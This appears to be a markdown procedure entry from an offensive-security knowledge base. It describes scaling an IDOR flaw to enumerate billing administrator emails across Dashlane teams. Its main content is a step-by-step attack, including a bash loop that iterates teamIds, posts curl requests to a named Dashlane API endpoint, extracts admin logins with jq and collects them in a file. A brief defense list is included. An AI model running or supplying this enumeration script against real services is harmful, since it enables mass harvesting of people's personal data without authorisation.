---
id: uuid-enumerate-teams
tags:
  - enumeration
  - scaling
  - multi-target
  - idor
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-dashlane-team-members]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:28:59.250Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Enumerate-Multiple-Teams-with-IDOR

## Summary

Scale the IDOR exploitation by iterating over multiple teamIds to systematically enumerate billing admin emails across Dashlane teams.

## Description

By incrementing teamId (e.g., sequential integers) or randomizing, attackers can query numerous teams, amplifying the privacy impact. Monitor for rate limits.

## Requirements

1. Working single-team exploit
2. List of potential teamIds (guess from 1 to 10000)
3. Script or manual repetition capability

## Defense

Defensive measures and detection strategies:

- Implement teamId validation and access controls
- Rate-limit per-user API calls
- Behavioral analytics for enumeration patterns

## Objectives

1. Query multiple teams
2. Aggregate email data
3. Assess full vulnerability scope

## Instructions

### Step 1: Prepare Team IDs

**Context**: Generate targets.

**Instructions**: Create a list of teamIds (e.g., 1001, 1002, ...).

### Step 2: Iterate Requests

**Context**: Resend with variations.

**Instructions**: In Burp Repeater, update teamId and send repeatedly. For automation, use [[commands/curl-dashlane-team-members]] in a loop script:

```bash
for id in {1001..1010}; do
  curl -X POST 'https://ws1.dashlane.com/1/teamPlans/members' -H 'Content-Type: application/x-www-form-urlencoded' -d "limit=0&login=example@email.com&orderBy=login&teamId=$id&uki=session_token" | jq '.billingAdmins[].login' >> emails.txt

done
```

> Collect unique emails in a file.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/curl-dashlane-team-members]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- enumeration
- loop
